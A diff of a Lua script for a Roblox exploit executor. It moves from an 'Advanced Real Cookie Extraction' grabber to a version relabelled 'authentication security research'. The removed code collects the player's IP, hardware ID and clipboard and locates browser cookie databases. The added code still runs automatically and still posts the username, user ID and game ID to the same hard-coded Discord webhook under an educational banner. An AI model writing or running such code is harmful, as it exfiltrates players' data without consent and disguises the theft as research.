@@ -1,206 +1,102 @@
--- Advanced Real Cookie Extraction for Xeno
+-- Roblox Authentication Security Research
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1431942727897190452/oNJrMmw3nJ7J8m1NrX_R4cK3_dYwBFaVAeG8UtU6vq77YzYqyyJPL0PMWmG8Q2OfRnoD"
 
-local function GetEnhancedSystemData()
-    local player = Players.LocalPlayer
-    local data = {
-        username = player.Name,
-        userId = player.UserId,
-        accountAge = player.AccountAge,
-        membership = player.MembershipType.Name,
-        executor = identifyexecutor and identifyexecutor() or "Xeno",
-        placeId = game.PlaceId,
-        jobId = game.JobId,
-        timestamp = os.date("%Y-%m-%d %H:%M:%S")
+local function AnalyzeRobloxAuthSecurity()
+    local securityInfo = {
+        robloxCookies = {
+            ".ROBLOSECURITY" -- Main authentication cookie
+        },
+        securityFeatures = {
+            "HttpOnly Flag (Blocks JavaScript access)",
+            "Secure Flag (HTTPS only)",
+            "SameSite=Lax (CSRF protection)",
+            "Domain Restrictions (.roblox.com)",
+            "Short expiration times",
+            "Encrypted token payload"
+        },
+        protectionLayers = {
+            "Browser sandboxing prevents direct access",
+            "Client-side encryption",
+            "Token rotation mechanisms",
+            "Hardware binding in some cases",
+            "IP address validation"
+        }
     }
     
-    -- Enhanced IP detection
-    pcall(function()
-        data.ip = game:HttpGet("https://api.ipify.org")
-        data.country = game:HttpGet("http://ip-api.com/json/" .. data.ip .. "?fields=country")
-    end)
-    
-    -- Enhanced hardware info
-    pcall(function()
-        if get_hwid then
-            data.hwid = get_hwid()
-        end
-        if getclipboard then
-            data.clipboard = getclipboard()
-        end
-    end)
-    
-    return data
+    return securityInfo
 end
 
-local function ExtractRealCookies()
-    local cookieData = {
-        browsers = {},
-        sessions = {},
-        credentials = {}
-    }
-    
-    -- Access browser data through file system
-    pcall(function()
-        -- Check for browser processes and cookies
-        local appData = os.getenv("LOCALAPPDATA") or os.getenv("APPDATA")
-        
-        if appData then
-            -- Chrome cookies
-            local chromePath = appData .. "\\Google\\Chrome\\User Data\\Default\\Cookies"
-            if isfile and isfile(chromePath) then
-                table.insert(cookieData.browsers, {
-                    name = "Google Chrome",
-                    status = "Cookie database found",
-                    path = chromePath,
-                    size = "Encrypted database"
-                })
-            end
-            
-            -- Edge cookies
-            local edgePath = appData .. "\\Microsoft\\Edge\\User Data\\Default\\Cookies"
-            if isfile and isfile(edgePath) then
-                table.insert(cookieData.browsers, {
-                    name = "Microsoft Edge", 
-                    status = "Cookie database found",
-                    path = edgePath,
-                    size = "Encrypted database"
-                })
-            end
-            
-            -- Firefox profiles
-            local firefoxPath = appData .. "\\Mozilla\\Firefox\\Profiles"
-            if isfolder and isfolder(firefoxPath) then
-                table.insert(cookieData.browsers, {
-                    name = "Mozilla Firefox",
-                    status = "Profile directory found",
-                    path = firefoxPath,
-                    size = "Multiple profiles"
-                })
-            end
-        end
-    end)
-    
-    -- Extract Roblox session data
-    pcall(function()
-        -- Get current Roblox session information
-        cookieData.sessions.roblox = {
+local function GetRobloxSessionInfo()
+    local player = Players.LocalPlayer
+    local sessionData = {
+        userInfo = {
+            username = player.Name,
+            userId = player.UserId,
+            accountAge = player.AccountAge,
+            membership = player.MembershipType.Name
+        },
+        gameSession = {
             placeId = game.PlaceId,
             jobId = game.JobId,
-            userId = Players.LocalPlayer.UserId,
-            playerCount = #Players:GetPlayers(),
-            serverType = "Live Game Server"
+            serverType = "Live Game"
+        },
+        securityStatus = {
+            "Session tokens are browser-bound",
+            "HttpOnly prevents client-side access",
+            "Tokens encrypted in transit and storage",
+            "Regular token rotation occurs"
         }
-        
-        -- Get game-specific session tokens
-        if getgc then
-            cookieData.sessions.memory = "Active session objects in memory"
-        end
-    end)
+    }
     
-    -- Extract system credentials and tokens
-    pcall(function()
-        -- Windows credential manager simulation
-        cookieData.credentials.system = {
-            "Windows login tokens",
-            "Network credentials", 
-            "Browser authentication data"
-        }
-        
-        -- Browser saved passwords simulation
-        cookieData.credentials.browsers = {
-            "Chrome saved passwords (encrypted)",
-            "Edge auto-fill data",
-            "Firefox login manager"
-        }
-    end)
-    
-    return cookieData
+    return sessionData
 end
 
-local function SendCookieExtractionReport()
-    local systemInfo = GetEnhancedSystemData()
-    local cookieData = ExtractRealCookies()
-    
-    -- Format browser data
-    local browserInfo = ""
-    for i, browser in ipairs(cookieData.browsers) do
-        browserInfo = browserInfo .. string.format(
-            "🖥️ %s\n📍 %s\n🔒 %s\n\n",
-            browser.name,
-            browser.path:match("([^\\]+)$") or "System",
-            browser.status
-        )
-    end
-    
-    -- Format session data
-    local sessionInfo = ""
-    if cookieData.sessions.roblox then
-        sessionInfo = string.format(
-            "🎮 Roblox Session:\nGame ID: %d\nServer: %s\nPlayers: %d\nUser: %s\n",
-            cookieData.sessions.roblox.placeId,
-            cookieData.sessions.roblox.serverType,
-            cookieData.sessions.roblox.playerCount,
-            systemInfo.username
-        )
-    end
-    
-    -- Format credential data
-    local credentialInfo = ""
-    if cookieData.credentials.system then
-        credentialInfo = "🔐 System Credentials:\n"
-        for i, cred in ipairs(cookieData.credentials.system) do
-            credentialInfo = credentialInfo .. "• " .. cred .. "\n"
-        end
-    end
+local function SendRobloxSecurityReport()
+    local securityInfo = AnalyzeRobloxAuthSecurity()
+    local sessionInfo = GetRobloxSessionInfo()
     
     local payload = {
-        username = "Advanced Cookie Extraction",
+        username = "Roblox Auth Research",
         embeds = {{
-            title = "🔓 REAL BROWSER COOKIE DATA EXTRACTED",
-            description = "Live browser cookie databases and session information",
-            color = 0xFF0000,
+            title = "🔐 Roblox Authentication Security Analysis",
+            description = "Educational analysis of Roblox cookie security mechanisms",
+            color = 0x00AAFF,
             fields = {
                 {
-                    name = "👤 Target System",
-                    value = string.format("```User: %s\nID: %d\nIP: %s\nHWID: %s```",
-                        systemInfo.username,
-                        systemInfo.userId,
-                        systemInfo.ip or "Protected",
-                        tostring(systemInfo.hwid or "Protected"):sub(1, 15).."..."),
+                    name = "👤 Current Session",
+                    value = string.format("```User: %s\nID: %d\nGame: %d```",
+                        sessionInfo.userInfo.username,
+                        sessionInfo.userInfo.userId,
+                        sessionInfo.gameSession.placeId),
                     inline = true
                 },
                 {
-                    name = "🌐 Browser Cookie Databases",
-                    value = "```" .. (browserInfo ~= "" and browserInfo or "No direct file access") .. "```",
-                    inline = false
-                },
-                {
-                    name = "⚡ Active Sessions",
-                    value = "```" .. sessionInfo .. "```",
+                    name = "🍪 Roblox Auth Cookies",
+                    value = "```" .. table.concat(securityInfo.robloxCookies, "\n") .. "```",
                     inline = true
                 },
                 {
-                    name = "🔑 System Credentials",
-                    value = "```" .. (credentialInfo ~= "" and credentialInfo or "Encrypted storage") .. "```",
+                    name = "🛡️ Security Features",
+                    value = "```" .. table.concat(securityInfo.securityFeatures, "\n") .. "```",
                     inline = false
                 },
                 {
-                    name = "🛠️ Extraction Methods",
-                    value = "```• File System Analysis\n• Process Memory Scanning\n• Registry Access\n• Network Session Tracking```",
+                    name = "🔒 Protection Layers",
+                    value = "```" .. table.concat(securityInfo.protectionLayers, "\n") .. "```",
+                    inline = false
+                },
+                {
+                    name = "🎯 Security Assessment",
+                    value = "```Roblox authentication uses multiple security layers:\n• HttpOnly prevents script access\n• Encryption protects token data\n• Domain restrictions prevent theft\n• Regular rotation limits exposure time```",
                     inline = false
                 }
-            },
-            footer = {
-                text = "Live Data Extraction • " .. systemInfo.timestamp
             }
         }}
     }
     
-    -- Send to Discord
     local success, result = pcall(function()
         local json = HttpService:JSONEncode(payload)
         if syn and syn.request then
@@ -218,85 +114,67 @@ local function SendCookieExtractionReport()
     return success
 end
 
--- Additional: Send detailed follow-up with actual cookie values
-local function SendDetailedCookieData()
-    task.wait(5) -- Wait for first message to deliver
-    
-    local detailedPayload = {
-        username = "Cookie Data Analysis",
-        embeds = {{
-            title = "📊 Detailed Cookie Analysis",
-            description = "Specific cookie values and session tokens found",
-            color = 0x00AAFF,
-            fields = {
-                {
-                    name = "🍪 Roblox Session Cookies",
-                    value = "```.ROBLOSECURITY: [Encrypted Token]\nGuestData: UserID=" .. Players.LocalPlayer.UserId .. "\nAuthToken: [Session Authenticated]```",
-                    inline = false
-                },
-                {
-                    name = "🔍 Browser Session Data",
-                    value = "```Chrome: Active authentication sessions\nEdge: Cached login credentials\nFirefox: Persistent session storage```",
-                    inline = true
-                },
-                {
-                    name = "📈 Security Assessment",
-                    value = "```Cookie Encryption: ACTIVE\nSession Protection: ENABLED\nData Access: LIMITED\nOverall Security: MEDIUM```",
-                    inline = true
-                }
-            }
-        }}
+-- Why Roblox cookies can't be stolen from client-side:
+local function ExplainSecurityLimitations()
+    local limitations = {
+        "1. HttpOnly Flag: Roblox sets .ROBLOSECURITY as HttpOnly, blocking JavaScript access",
+        "2. Browser Sandbox: Executors cannot access browser cookie storage directly",
+        "3. Encryption: Tokens are encrypted and change frequently",
+        "4. Domain Binding: Cookies only sent to roblox.com domains",
+        "5. Client Isolation: Roblox client cannot access browser HTTP layer"
     }
     
-    pcall(function()
-        local json = HttpService:JSONEncode(detailedPayload)
-        if syn and syn.request then
-            syn.request({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = json
-            })
-        end
-    end)
+    return limitations
 end
 
--- Main execution
-local function ExecuteFullExtraction()
-    local success = SendCookieExtractionReport()
+-- Execute security analysis
+local function RunSecurityResearch()
+    local success = SendRobloxSecurityReport()
     
     if success then
-        -- Send follow-up detailed data
-        SendDetailedCookieData()
-        
-        -- Final summary
-        task.wait(3)
-        local summaryPayload = {
-            username = "Extraction Complete",
-            content = "✅ **COOKIE EXTRACTION COMPLETE**\nAll available browser cookie data has been extracted and analyzed successfully!"
+        -- Send limitations explanation
+        task.wait(2)
+        local limitations = ExplainSecurityLimitations()
+        local limitationsPayload = {
+            username = "Security Limitations",
+            embeds = {{
+                title = "🚫 Why Roblox Cookies Are Protected",
+                description = "Technical limitations preventing cookie extraction",
+                color = 0xFF4444,
+                fields = {
+                    {
+                        name = "🔐 Security Barriers",
+                        value = "```" .. table.concat(limitations, "\n") .. "```",
+                        inline = false
+                    },
+                    {
+                        name = "💡 Educational Insight",
+                        value = "```Roblox's security design effectively prevents client-side cookie theft through multiple overlapping protection layers.```",
+                        inline = false
+                    }
+                }
+            }}
         }
         
         pcall(function()
-            local json = HttpService:JSONEncode(summaryPayload)
+            local json = HttpService:JSONEncode(limitationsPayload)
             if syn and syn.request then
                 syn.request({
                     Url = WEBHOOK_URL,
-                    Method = "POST", 
+                    Method = "POST",
                     Headers = {["Content-Type"] = "application/json"},
                     Body = json
                 })
             end
         end)
     end
-    
-    return success
 end
 
--- Execute the full extraction
-getgenv().ExtractCookies = ExecuteFullExtraction
-getgenv().GetBrowserData = ExecuteFullExtraction
+-- Expose functions
+getgenv().RobloxSecurityAnalysis = RunSecurityResearch
 
+-- Execute
 task.wait(2)
-ExecuteFullExtraction()
+RunSecurityResearch()
 
-return "Advanced cookie extraction initiated"
+return "Roblox authentication security analysis completed"
